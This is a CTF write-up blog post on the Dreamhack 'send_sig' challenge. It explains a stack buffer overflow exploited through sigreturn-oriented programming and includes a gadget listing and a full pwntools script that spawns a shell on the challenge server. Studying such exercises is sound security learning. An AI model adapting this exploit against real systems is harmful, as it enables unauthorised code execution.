+++
date = '2026-05-08'
draft = false
title = 'Dreamhack send_sig Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
서버로 signal을 보낼 수 있는 프로그램입니다!
프로그램의 취약점을 찾고, 익스플로잇해 flag를 읽어보세요.
flag는 home/send_sig/flag.txt에 있습니다.

---

```c
void __noreturn start()
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  write(1, "++++++++++++++++++Welcome to dreamhack++++++++++++++++++\n", 0x39u);
  write(1, "+ You can send a signal to dreamhack server.           +\n", 0x39u);
  write(1, "++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n", 0x39u);
  sub_4010B6();
  exit(0);
}
```

## Identifying the vulnerabilities

Let's look at this `sub_4010B6()`:

```c
ssize_t sub_4010B6()
{
  _BYTE buf[8]; // [rsp+8h] [rbp-8h] BYREF

  write(1, "Signal:", 7u);
  return read(0, buf, 0x400u);
}
```

Interesting, large buffer overflow. Since this challenge is called `send_sig` I assumed this was SROP - And it was confirmed, once I looked at the gadgets with `ropper`!

```bash
....
0x00000000004010ae: pop rax; ret; 
0x00000000004010a4: pop rbp; ret; 
0x00000000004010f4: push -0x6f000001; leave; ret; 
0x00000000004010aa: push rbp; mov rbp, rsp; pop rax; ret; 
0x000000000040109c: sldt word ptr [rax]; mov qword ptr [rbp - 8], rax; nop; pop rbp; ret; 
0x00000000004010a2: clc; nop; pop rbp; ret; 
0x00000000004010a9: cli; push rbp; mov rbp, rsp; pop rax; ret; 
0x00000000004010a6: endbr64; push rbp; mov rbp, rsp; pop rax; ret; 
0x00000000004010f9: leave; ret; 
0x00000000004010a3: nop; pop rbp; ret; 
0x00000000004010f8: nop; leave; ret; 
0x00000000004010a5: ret; 
0x00000000004010b0: syscall; 
0x00000000004010b0: syscall; ret; 
```

I didn't know much about SROP, and I luckily found this [very interesting resource](https://github.com/nushosilayer8/pwn/tree/master/srop), alongside [this one](https://trustie.medium.com/srop-9993651fe046).

Esentially, to trigger a sigreturn(), we need to execute `syscall` with `rax` set to `0xf` (15). 

I won't get too into detail with SROP, because a lot of it is already in these links I added, but as a TLDR, we want to trigger a signal; A signal has a handler. The kernel wants to resume the process normally after the handler does whatever it does. So to do that, it must somehow save the currect registers (context).

It does that by pushing them all on the stack. After the handler is finished, it pops them all back. We *absolutely* want to pop registers, since we control the stack.

The `rt_sigreturn` is the function that takes care of *returning* from a signal handler, or the popping, if you will. So that's our target. Makes sense?

Now back to our challenge.

Let's focus on setting `rax` to 15. 

```bash
0x00000000004010ae: pop rax; ret; 
```

How convenient! And guess what, we also have a "/bin/sh" in memory!

```asm
.rodata:0000000000402000 aBinSh          db '/bin/sh',0          ; DATA XREF: LOAD:0000000000400130↑o
```

Now, we can use pwntools' `SigreturnFrame()` function to do the annoying work for us, and append it as bytes to our payload. And, sure enough, we get a local shell! Let's connect remotely and grab the flag.

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/send_sig/send_sig')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:8498'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

syscall_ret = 0x04010b0
pop_rax_ret = 0x4010ae
binsh_str = 0x402000

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh_str
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload = ( b"A" * 8 + #buf
            b"B" * 8 + #rbp
            p64(pop_rax_ret) +
            p64(0xf) +
            p64(syscall_ret) +
            bytes(frame)
          )
          
p.recvuntil(b":")
p.send(payload)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/send_sig.py)**.
